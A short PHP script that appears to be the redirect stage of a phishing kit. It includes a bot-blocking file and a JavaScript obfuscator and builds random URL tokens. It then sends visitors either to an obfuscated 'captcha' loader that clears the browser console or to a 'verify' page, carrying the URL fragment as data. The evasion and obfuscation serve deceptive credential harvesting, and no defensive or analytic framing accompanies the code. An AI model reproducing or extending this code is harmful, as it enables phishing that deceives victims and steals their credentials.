<?php

include "boblock.php";
require_once "obfuscator.php";
function rndString($length = 10)
{
    return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, $length);
}
$randpart = $randfirstpart . '' . RndString(8) . "-" . RndString(4) . "-" . RndString(4) . "-" . RndString(4) . "-" . RndString(12) . "_" . RndString(50) . '' . RndString(50) . '' . RndString(50);
if ($captha == 1) {
    $jsCode = "var req = new XMLHttpRequest();\n            if(window.location.hash){\n            var hash = location.hash.substr(1);\n            \n            }\n            req.open('GET', 'capt', false);\n            req.send(null);\n            \n            if(req.status == 200) {\n               document.write(req.responseText);\n            }\n            \n            function clearConsole() { \n                if(window.console || window.console.firebug) {\n                   console.clear();\n                }\n            }\n            \n            clearConsole();";
    $hunter = new HunterObfuscator($jsCode);
    $obsfucated = $hunter->Obfuscate();
    ?>
<html><head><?php 
    echo "<script>var hash = location.hash.substr(1); window.location.href = 'capt?" . $randpart . "#'+hash;</script>";
} elseif ($captha == 0) {
    ?>
<script>var hash=location.hash.substr(1);window.location.href="verify?<?php 
    echo $randpart;
    ?>
&data="+hash</script><?php 
}
?>
</head></html>
